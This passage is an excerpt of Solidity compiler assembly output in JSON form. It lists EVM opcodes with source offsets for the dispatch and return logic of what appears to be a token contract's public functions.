											"name": "DUP1"
										},
										{
											"begin": 3155,
											"end": 3411,
											"name": "SWAP2"
										},
										{
											"begin": 3155,
											"end": 3411,
											"name": "SUB"
										},
										{
											"begin": 3155,
											"end": 3411,
											"name": "SWAP1"
										},
										{
											"begin": 3155,
											"end": 3411,
											"name": "RETURN"
										},
										{
											"begin": 1522,
											"end": 1605,
											"name": "tag",
											"value": "7"
										},
										{
											"begin": 1522,
											"end": 1605,
											"name": "JUMPDEST"
										},
										{
											"begin": 1522,
											"end": 1605,
											"name": "CALLVALUE"
										},
										{
											"begin": 8,
											"end": 17,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "59"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 30,
											"end": 31,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 27,
											"end": 28,
											"name": "DUP1"
										},
										{
											"begin": 20,
											"end": 32,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "59"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 1522,
											"end": 1605,
											"name": "POP"
										},
										{
											"begin": 1522,
											"end": 1605,
											"name": "PUSH [tag]",
											"value": "60"
										},
										{
											"begin": 1522,
											"end": 1605,
											"name": "PUSH [tag]",
											"value": "61"
										},
										{
											"begin": 1522,
											"end": 1605,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 1522,
											"end": 1605,
											"name": "tag",
											"value": "60"
										},
										{
											"begin": 1522,
											"end": 1605,
											"name": "JUMPDEST"
										},
										{
											"begin": 1522,
											"end": 1605,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 1522,
											"end": 1605,
											"name": "MLOAD"
										},
										{
											"begin": 1522,
											"end": 1605,
											"name": "DUP1"
										},
										{
											"begin": 1522,
											"end": 1605,
											"name": "DUP3"
										},
										{
											"begin": 1522,
											"end": 1605,
											"name": "PUSH",
											"value": "FF"
										},
										{
											"begin": 1522,
											"end": 1605,
											"name": "AND"
										},
										{
											"begin": 1522,
											"end": 1605,
											"name": "PUSH",
											"value": "FF"
										},
										{
											"begin": 1522,
											"end": 1605,
											"name": "AND"
										},
										{
											"begin": 1522,
											"end": 1605,
											"name": "DUP2"
										},
										{
											"begin": 1522,
											"end": 1605,
											"name": "MSTORE"
										},
										{
											"begin": 1522,
											"end": 1605,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 1522,
											"end": 1605,
											"name": "ADD"
										},
										{
											"begin": 1522,
											"end": 1605,
											"name": "SWAP2"
										},
										{
											"begin": 1522,
											"end": 1605,
											"name": "POP"
										},
										{
											"begin": 1522,
											"end": 1605,
											"name": "POP"
										},
										{
											"begin": 1522,
											"end": 1605,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 1522,
											"end": 1605,
											"name": "MLOAD"
										},
										{
											"begin": 1522,
											"end": 1605,
											"name": "DUP1"
										},
										{
											"begin": 1522,
											"end": 1605,
											"name": "SWAP2"
										},
										{
											"begin": 1522,
											"end": 1605,
											"name": "SUB"
										},
										{
											"begin": 1522,
											"end": 1605,
											"name": "SWAP1"
										},
										{
											"begin": 1522,
											"end": 1605,
											"name": "RETURN"
										},
										{
											"begin": 3820,
											"end": 4026,
											"name": "tag",
											"value": "8"
										},
										{
											"begin": 3820,
											"end": 4026,
											"name": "JUMPDEST"
										},
										{
											"begin": 3820,
											"end": 4026,
											"name": "CALLVALUE"
										},
										{
											"begin": 8,
											"end": 17,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "62"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 30,
											"end": 31,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 27,
											"end": 28,
											"name": "DUP1"
										},
										{
											"begin": 20,
											"end": 32,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "62"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 3820,
											"end": 4026,
											"name": "POP"
										},
										{
											"begin": 3820,
											"end": 4026,
											"name": "PUSH [tag]",
											"value": "63"
										},
										{
											"begin": 3820,
											"end": 4026,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 3820,
											"end": 4026,
											"name": "DUP1"
										},
										{
											"begin": 3820,
											"end": 4026,
											"name": "CALLDATASIZE"
										},
										{
											"begin": 3820,
											"end": 4026,
											"name": "SUB"
										},
										{
											"begin": 13,
											"end": 15,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 8,
											"end": 11,
											"name": "DUP2"
										},
										{
											"begin": 5,
											"end": 16,
											"name": "LT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"value": "64"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI"
										},
										{
											"begin": 29,
											"end": 30,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 26,
											"end": 27,
											"name": "DUP1"
										},
										{
											"begin": 19,
											"end": 31,
											"name": "REVERT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"value": "64"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST"
										},
										{
											"begin": 3820,
											"end": 4026,
											"name": "DUP2"
										},
										{
											"begin": 3820,
											"end": 4026,
											"name": "ADD"
										},
										{
											"begin": 3820,
											"end": 4026,
											"name": "SWAP1"
										},
										{
											"begin": 3820,
											"end": 4026,
											"name": "DUP1"
										},
										{
											"begin": 3820,
											"end": 4026,
											"name": "DUP1"
										},
										{
											"begin": 3820,
											"end": 4026,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 3820,
											"end": 4026,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 3820,
											"end": 4026,
											"name": "AND"
										},
										{
											"begin": 3820,
											"end": 4026,
											"name": "SWAP1"
										},
										{
											"begin": 3820,
											"end": 4026,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 3820,
											"end": 4026,
											"name": "ADD"
										},
										{
											"begin": 3820,
											"end": 4026,
											"name": "SWAP1"
										},
										{
											"begin": 3820,
											"end": 4026,
											"name": "SWAP3"
										},
										{
											"begin": 3820,
											"end": 4026,
											"name": "SWAP2"
										},
										{
											"begin": 3820,
											"end": 4026,
											"name": "SWAP1"
										},
										{
											"begin": 3820,
											"end": 4026,
											"name": "DUP1"
										},
										{
											"begin": 3820,
											"end": 4026,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 3820,
											"end": 4026,
											"name": "SWAP1"
										},
										{
											"begin": 3820,
											"end": 4026,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 3820,
											"end": 4026,
											"name": "ADD"
										},
										{
											"begin": 3820,
											"end": 4026,
											"name": "SWAP1"
										},
										{
											"begin": 3820,
											"end": 4026,
											"name": "SWAP3"
										},
										{
											"begin": 3820,
											"end": 4026,
											"name": "SWAP2"
										},
										{
											"begin": 3820,
											"end": 4026,
											"name": "SWAP1"
										},
										{
											"begin": 3820,
											"end": 4026,
											"name": "POP"
										},
										{
											"begin": 3820,
											"end": 4026,
											"name": "POP"
										},
										{
											"begin": 3820,
											"end": 4026,
											"name": "POP"
										},
										{
											"begin": 3820,
											"end": 4026,
											"name": "PUSH [tag]",
											"value": "65"
										},
										{
											"begin": 3820,
											"end": 4026,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 3820,
											"end": 4026,
											"name": "tag",
											"value": "63"
										},
										{
											"begin": 3820,
											"end": 4026,
											"name": "JUMPDEST"
										},
										{
											"begin": 3820,
											"end": 4026,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 3820,
											"end": 4026,
											"name": "MLOAD"
										},
										{
											"begin": 3820,
											"end": 4026,
											"name": "DUP1"
										},
										{
											"begin": 3820,
											"end": 4026,
											"name": "DUP3"
										},
										{
											"begin": 3820,
											"end": 4026,
											"name": "ISZERO"
										},
										{
											"begin": 3820,
											"end": 4026,
											"name": "ISZERO"
										},
										{
											"begin": 3820,
											"end": 4026,
											"name": "ISZERO"
										},
										{
											"begin": 3820,
											"end": 4026,
											"name": "ISZERO"
										},
										{
											"begin": 3820,
											"end": 4026,
											"name": "DUP2"
										},
										{
											"begin": 3820,
											"end": 4026,
											"name": "MSTORE"
										},
										{
											"begin": 3820,
											"end": 4026,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 3820,
											"end": 4026,
											"name": "ADD"
										},
										{
											"begin": 3820,
											"end": 4026,
											"name": "SWAP2"
										},
										{
											"begin": 3820,
											"end": 4026,
											"name": "POP"
										},
										{
											"begin": 3820,
											"end": 4026,
											"name": "POP"
										},
										{
											"begin": 3820,
											"end": 4026,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 3820,
											"end": 4026,
											"name": "MLOAD"
										},
										{
											"begin": 3820,
											"end": 4026,
											"name": "DUP1"
										},
										{
											"begin": 3820,
											"end": 4026,
											"name": "SWAP2"
										},
										{
											"begin": 3820,
											"end": 4026,
											"name": "SUB"
										},
										{
											"begin": 3820,
											"end": 4026,
											"name": "SWAP1"
										},
										{
											"begin": 3820,
											"end": 4026,
											"name": "RETURN"
										},
										{
											"begin": 3075,
											"end": 3207,
											"name": "tag",
											"value": "9"
										},
										{
											"begin": 3075,
											"end": 3207,
											"name": "JUMPDEST"
										},
										{
											"begin": 3075,
											"end": 3207,
											"name": "CALLVALUE"
										},
										{
											"begin": 8,
											"end": 17,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "66"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 30,
											"end": 31,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 27,
											"end": 28,
											"name": "DUP1"
										},
										{
											"begin": 20,
											"end": 32,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "66"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 3075,
											"end": 3207,
											"name": "POP"
										},
										{
											"begin": 3075,
											"end": 3207,
											"name": "PUSH [tag]",
											"value": "67"
										},
										{
											"begin": 3075,
											"end": 3207,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 3075,
											"end": 3207,
											"name": "DUP1"
										},
										{
											"begin": 3075,
											"end": 3207,
											"name": "CALLDATASIZE"
										},
										{
											"begin": 3075,
											"end": 3207,
											"name": "SUB"
										},
										{
											"begin": 13,
											"end": 15,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 8,
											"end": 11,
											"name": "DUP2"
										},
										{
											"begin": 5,
											"end": 16,
											"name": "LT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"value": "68"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI"
										},
										{
											"begin": 29,
											"end": 30,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 26,
											"end": 27,
											"name": "DUP1"
										},
										{
											"begin": 19,
											"end": 31,
											"name": "REVERT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"value": "68"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST"
										},
										{
											"begin": 3075,
											"end": 3207,
											"name": "DUP2"
										},
										{
											"begin": 3075,
											"end": 3207,
											"name": "ADD"
										},
										{
											"begin": 3075,
											"end": 3207,
											"name": "SWAP1"
										},
										{
											"begin": 3075,
											"end": 3207,
											"name": "DUP1"
										},
										{
											"begin": 3075,
											"end": 3207,
											"name": "DUP1"
										},
										{
											"begin": 3075,
											"end": 3207,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 3075,
											"end": 3207,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 3075,
											"end": 3207,
											"name": "AND"
										},
										{
											"begin": 3075,
											"end": 3207,
											"name": "SWAP1"
										},
										{
											"begin": 3075,
											"end": 3207,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 3075,
											"end": 3207,
											"name": "ADD"
										},
										{
											"begin": 3075,
											"end": 3207,
											"name": "SWAP1"
										},
										{
											"begin": 3075,
											"end": 3207,
											"name": "SWAP3"
										},
										{
											"begin": 3075,
											"end": 3207,
											"name": "SWAP2"
										},
										{
											"begin": 3075,
											"end": 3207,
											"name": "SWAP1"
										},
										{
											"begin": 3075,
											"end": 3207,
											"name": "POP"
										},
										{
											"begin": 3075,
											"end": 3207,
											"name": "POP"
										},
										{
											"begin": 3075,
											"end": 3207,
											"name": "POP"
										},
										{
											"begin": 3075,
											"end": 3207,
											"name": "PUSH [tag]",
											"value": "69"
										},
										{
											"begin": 3075,
											"end": 3207,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 3075,
											"end": 3207,
											"name": "tag",
											"value": "67"
										},
										{
											"begin": 3075,
											"end": 3207,
											"name": "JUMPDEST"
										},
										{
											"begin": 3075,
											"end": 3207,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 3075,
											"end": 3207,
											"name": "MLOAD"
										},
										{
											"begin": 3075,
											"end": 3207,
											"name": "DUP1"
										},
										{
											"begin": 3075,
											"end": 3207,
											"name": "DUP3"
										},
										{
											"begin": 3075,
											"end": 3207,
											"name": "ISZERO"
										},
										{
											"begin": 3075,
											"end": 3207,
											"name": "ISZERO"
										},
										{
											"begin": 3075,
											"end": 3207,
											"name": "ISZERO"
										},
										{
											"begin": 3075,
											"end": 3207,
											"name": "ISZERO"
										},
										{
											"begin": 3075,
											"end": 3207,
											"name": "DUP2"
										},
										{
											"begin": 3075,
											"end": 3207,
											"name": "MSTORE"
										},
										{
											"begin": 3075,
											"end": 3207,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 3075,
											"end": 3207,
											"name": "ADD"
										},
										{
											"begin": 3075,
											"end": 3207,
											"name": "SWAP2"
										},
										{
											"begin": 3075,
											"end": 3207,
											"name": "POP"
										},
										{
											"begin": 3075,
											"end": 3207,
											"name": "POP"
										},
										{
											"begin": 3075,
											"end": 3207,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 3075,
											"end": 3207,
											"name": "MLOAD"
										},
										{
											"begin": 3075,
											"end": 3207,
											"name": "DUP1"
										},
										{
											"begin": 3075,
											"end": 3207,
											"name": "SWAP2"
										},
										{
											"begin": 3075,
											"end": 3207,
											"name": "SUB"
										},
										{
											"begin": 3075,
											"end": 3207,
											"name": "SWAP1"
										},
										{
											"begin": 3075,
											"end": 3207,
											"name": "RETURN"
										},
										{
											"begin": 3640,
											"end": 3842,
											"name": "tag",
											"value": "10"
										},
										{
											"begin": 3640,
											"end": 3842,
											"name": "JUMPDEST"
										},
										{
											"begin": 3640,
											"end": 3842,
											"name": "CALLVALUE"
										},
										{
											"begin": 8,
											"end": 17,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "70"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 30,
											"end": 31,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 27,
											"end": 28,
											"name": "DUP1"
										},
										{
											"begin": 20,
											"end": 32,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "70"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 3640,
											"end": 3842,
											"name": "POP"
										},
										{
											"begin": 3640,
											"end": 3842,
											"name": "PUSH [tag]",
											"value": "71"
										},
										{
											"begin": 3640,
											"end": 3842,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 3640,
											"end": 3842,
											"name": "DUP1"
										},
										{
											"begin": 3640,
											"end": 3842,
											"name": "CALLDATASIZE"
										},
										{
											"begin": 3640,
											"end": 3842,
											"name": "SUB"
										},
										{
											"begin": 13,
											"end": 15,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 8,
											"end": 11,
											"name": "DUP2"
										},
										{
											"begin": 5,
											"end": 16,
											"name": "LT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"value": "72"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI"
										},
										{
											"begin": 29,
											"end": 30,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 26,
											"end": 27,
											"name": "DUP1"
										},
										{
											"begin": 19,
											"end": 31,
											"name": "REVERT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"value": "72"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST"
										},
										{
											"begin": 3640,
											"end": 3842,
											"name": "DUP2"
										},
										{
											"begin": 3640,
											"end": 3842,
											"name": "ADD"
										},
										{
											"begin": 3640,
											"end": 3842,
											"name": "SWAP1"
										},
										{
											"begin": 3640,
											"end": 3842,
											"name": "DUP1"
										},
										{
											"begin": 3640,
											"end": 3842,
											"name": "DUP1"
										},
										{
											"begin": 3640,
											"end": 3842,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 3640,
											"end": 3842,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 3640,
											"end": 3842,
											"name": "AND"
										},
										{
											"begin": 3640,
											"end": 3842,
											"name": "SWAP1"
										},
										{
											"begin": 3640,
											"end": 3842,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 3640,
											"end": 3842,
											"name": "ADD"
										},
										{
											"begin": 3640,
											"end": 3842,
											"name": "SWAP1"
										},
										{
											"begin": 3640,
											"end": 3842,
											"name": "SWAP3"
										},
										{
											"begin": 3640,
											"end": 3842,
											"name": "SWAP2"
										},
										{
											"begin": 3640,
											"end": 3842,
											"name": "SWAP1"
										},
										{
											"begin": 3640,
											"end": 3842,
											"name": "POP"
										},
										{
											"begin": 3640,
											"end": 3842,
											"name": "POP"
										},
										{
											"begin": 3640,
											"end": 3842,
											"name": "POP"
										},
										{
											"begin": 3640,
											"end": 3842,
											"name": "PUSH [tag]",
											"value": "73"
										},
										{
											"begin": 3640,
											"end": 3842,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 3640,
											"end": 3842,
											"name": "tag",
											"value": "71"
										},
										{
											"begin": 3640,
											"end": 3842,
											"name": "JUMPDEST"
										},
										{
											"begin": 3640,
											"end": 3842,
											"name": "STOP"
										},
										{
											"begin": 3850,
											"end": 4115,
											"name": "tag",
											"value": "11"
										},
										{
											"begin": 3850,
											"end": 4115,
											"name": "JUMPDEST"
										},
										{
											"begin": 3850,
											"end": 4115,
											"name": "CALLVALUE"
										},
										{
											"begin": 8,
											"end": 17,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "74"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 30,
											"end": 31,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 27,
											"end": 28,
											"name": "DUP1"
										},
										{
											"begin": 20,
											"end": 32,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "74"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 3850,
											"end": 4115,
											"name": "POP"
										},
										{
											"begin": 3850,
											"end": 4115,
											"name": "PUSH [tag]",
											"value": "75"
										},
										{
											"begin": 3850,
											"end": 4115,
											"name": "PUSH [tag]",
											"value": "76"
										},
										{
											"begin": 3850,
											"end": 4115,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 3850,
											"end": 4115,
											"name": "tag",
											"value": "75"
										},
										{
											"begin": 3850,
											"end": 4115,
											"name": "JUMPDEST"
										},
										{
											"begin": 3850,
											"end": 4115,
											"name": "STOP"
										},
										{
											"begin": 2567,
											"end": 2605,
											"name": "tag",
											"value": "12"
										},
										{
											"begin": 2567,
											"end": 2605,
											"name": "JUMPDEST"
										},
										{
											"begin": 2567,
											"end": 2605,
											"name": "CALLVALUE"
										},
										{
											"begin": 8,
											"end": 17,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "77"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 30,
											"end": 31,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 27,
											"end": 28,
											"name": "DUP1"
										},
										{
											"begin": 20,
											"end": 32,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "77"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 2567,
											"end": 2605,
											"name": "POP"
										},
										{
											"begin": 2567,
											"end": 2605,
											"name": "PUSH [tag]",
											"value": "78"
										},
										{
											"begin": 2567,
											"end": 2605,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 2567,
											"end": 2605,
											"name": "DUP1"
										},
										{
											"begin": 2567,
											"end": 2605,
											"name": "CALLDATASIZE"
										},
										{
											"begin": 2567,
											"end": 2605,
											"name": "SUB"
										},
										{
											"begin": 13,
											"end": 15,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 8,
											"end": 11,
											"name": "DUP2"
										},
										{
											"begin": 5,
											"end": 16,
											"name": "LT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"value": "79"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI"
										},
										{
											"begin": 29,
											"end": 30,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 26,
											"end": 27,
											"name": "DUP1"
										},
										{
											"begin": 19,
											"end": 31,
											"name": "REVERT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"value": "79"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST"
										},
										{
											"begin": 2567,
											"end": 2605,
											"name": "DUP2"
										},
										{
											"begin": 2567,
											"end": 2605,
											"name": "ADD"
										},
										{
											"begin": 2567,
											"end": 2605,
											"name": "SWAP1"
										},
										{
											"begin": 2567,
											"end": 2605,
											"name": "DUP1"
										},
										{
											"begin": 2567,
											"end": 2605,
											"name": "DUP1"
										},
										{
											"begin": 2567,
											"end": 2605,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 2567,
											"end": 2605,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 2567,
											"end": 2605,
											"name": "AND"
										},
										{
											"begin": 2567,
											"end": 2605,
											"name": "SWAP1"
										},
										{
											"begin": 2567,
											"end": 2605,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 2567,
											"end": 2605,
											"name": "ADD"
										},
										{
											"begin": 2567,
											"end": 2605,
											"name": "SWAP1"
										},
										{
											"begin": 2567,
											"end": 2605,
											"name": "SWAP3"
										},
										{
											"begin": 2567,
											"end": 2605,
											"name": "SWAP2"
										},
										{
											"begin": 2567,
											"end": 2605,
											"name": "SWAP1"
										},
										{
											"begin": 2567,
											"end": 2605,
											"name": "POP"
										},
										{
											"begin": 2567,
											"end": 2605,
											"name": "POP"
										},
										{
											"begin": 2567,
											"end": 2605,
											"name": "POP"
										},
										{
											"begin": 2567,
											"end": 2605,
											"name": "PUSH [tag]",
											"value": "80"
										},
										{
											"begin": 2567,
											"end": 2605,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 2567,
											"end": 2605,
											"name": "tag",
											"value": "78"
										},
										{
											"begin": 2567,
											"end": 2605,
											"name": "JUMPDEST"
										},
										{
											"begin": 2567,
											"end": 2605,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 2567,
											"end": 2605,
											"name": "MLOAD"
										},
										{
											"begin": 2567,
											"end": 2605,
											"name": "DUP1"
										},
										{
											"begin": 2567,
											"end": 2605,
											"name": "DUP3"
										},
										{
											"begin": 2567,
											"end": 2605,
											"name": "ISZERO"
										},
										{
											"begin": 2567,
											"end": 2605,
											"name": "ISZERO"
										},
										{
											"begin": 2567,
											"end": 2605,
											"name": "ISZERO"
										},
										{
											"begin": 2567,
											"end": 2605,
											"name": "ISZERO"
										},
										{
											"begin": 2567,
											"end": 2605,
											"name": "DUP2"
										},
										{
											"begin": 2567,
											"end": 2605,
											"name": "MSTORE"
										},
										{
											"begin": 2567,
											"end": 2605,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 2567,
											"end": 2605,
											"name": "ADD"
										},
										{
											"begin": 2567,
											"end": 2605,
											"name": "SWAP2"
										},
										{
											"begin": 2567,
											"end": 2605,
											"name": "POP"
										},
										{
											"begin": 2567,
											"end": 2605,
											"name": "POP"
										},
										{
											"begin": 2567,
											"end": 2605,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 2567,
											"end": 2605,
											"name": "MLOAD"
										},
										{
											"begin": 2567,
											"end": 2605,
											"name": "DUP1"
										},
										{
											"begin": 2567,
											"end": 2605,
											"name": "SWAP2"
										},
										{
											"begin": 2567,
											"end": 2605,
											"name": "SUB"
										},
										{
											"begin": 2567,
											"end": 2605,
											"name": "SWAP1"
										},
										{
											"begin": 2567,
											"end": 2605,
											"name": "RETURN"
										},
										{
											"begin": 311,
											"end": 340,
											"name": "tag",
											"value": "13"
										},
										{
											"begin": 311,
											"end": 340,
											"name": "JUMPDEST"
										},
										{
											"begin": 311,
											"end": 340,
											"name": "CALLVALUE"
										},
										{
											"begin": 8,
											"end": 17,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "81"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 30,
											"end": 31,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 27,
											"end": 28,
											"name": "DUP1"
										},
										{
											"begin": 20,
											"end": 32,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "81"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 311,
											"end": 340,
											"name": "POP"
										},
										{
											"begin": 311,
											"end": 340,
											"name": "PUSH [tag]",
											"value": "82"
										},
										{
											"begin": 311,
											"end": 340,
											"name": "PUSH [tag]",
											"value": "83"
										},
										{
											"begin": 311,
											"end": 340,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 311,
											"end": 340,
											"name": "tag",
											"value": "82"
										},
										{
											"begin": 311,
											"end": 340,
											"name": "JUMPDEST"
										},
										{
											"begin": 311,
											"end": 340,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 311,
											"end": 340,
											"name": "MLOAD"
										},
										{
											"begin": 311,
											"end": 340,
											"name": "DUP1"
										},
										{
											"begin": 311,
											"end": 340,
											"name": "DUP3"
										},
										{
											"begin": 311,
											"end": 340,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 311,
											"end": 340,
											"name": "AND"
										},
										{
											"begin": 311,
											"end": 340,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 311,
											"end": 340,
											"name": "AND"
										},
										{
											"begin": 311,
											"end": 340,
											"name": "DUP2"
										},
										{
											"begin": 311,
											"end": 340,
											"name": "MSTORE"
										},
										{
											"begin": 311,
											"end": 340,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 311,
											"end": 340,
											"name": "ADD"
										},
										{
											"begin": 311,
											"end": 340,
											"name": "SWAP2"
										},
										{
											"begin": 311,
											"end": 340,
											"name": "POP"
										},
										{
											"begin": 311,
											"end": 340,
											"name": "POP"
										},
										{
											"begin": 311,
											"end": 340,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 311,
											"end": 340,
											"name": "MLOAD"
										},
										{
											"begin": 311,
											"end": 340,
											"name": "DUP1"
										},
										{
											"begin": 311,
											"end": 340,
											"name": "SWAP2"
										},
										{
											"begin": 311,
											"end": 340,
											"name": "SUB"
										},
										{
											"begin": 311,
											"end": 340,
											"name": "SWAP1"
										},
										{
											"begin": 311,
											"end": 340,
											"name": "RETURN"
										},
										{
											"begin": 1713,
											"end": 1823,
											"name": "tag",
											"value": "14"
										},
										{
											"begin": 1713,
											"end": 1823,
											"name": "JUMPDEST"
										},
										{
											"begin": 1713,
											"end": 1823,
											"name": "CALLVALUE"
										},
										{
											"begin": 8,
											"end": 17,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
